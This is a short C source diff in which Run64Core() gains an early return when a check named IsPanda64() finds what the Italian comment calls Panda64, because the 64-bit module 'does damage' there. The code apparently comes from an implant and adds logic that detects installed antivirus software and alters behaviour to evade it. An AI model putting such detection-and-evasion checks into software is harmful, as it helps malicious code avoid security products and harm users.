@@ -137,6 +137,7 @@ void RevertWow64Fs(PVOID OldValue)
 	pWow64RevertWow64FsRedirection(OldValue);
 }
 
+extern BOOL IsPanda64();
 void Run64Core()
 {
 	char dll64_path[MAX_PATH];
@@ -149,6 +150,10 @@ void Run64Core()
 	Wow64RevertWow64FsRedirection_PROC pWow64RevertWow64FsRedirection;
 
 	if (!IsX64System())
+		return;
+
+	// Se e' presente Panda64 il modulo a 64 bit fa danni
+	if (IsPanda64())
 		return;
 
 	pWow64DisableWow64FsRedirection = (Wow64DisableWow64FsRedirection_PROC)HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "Wow64DisableWow64FsRedirection"); 
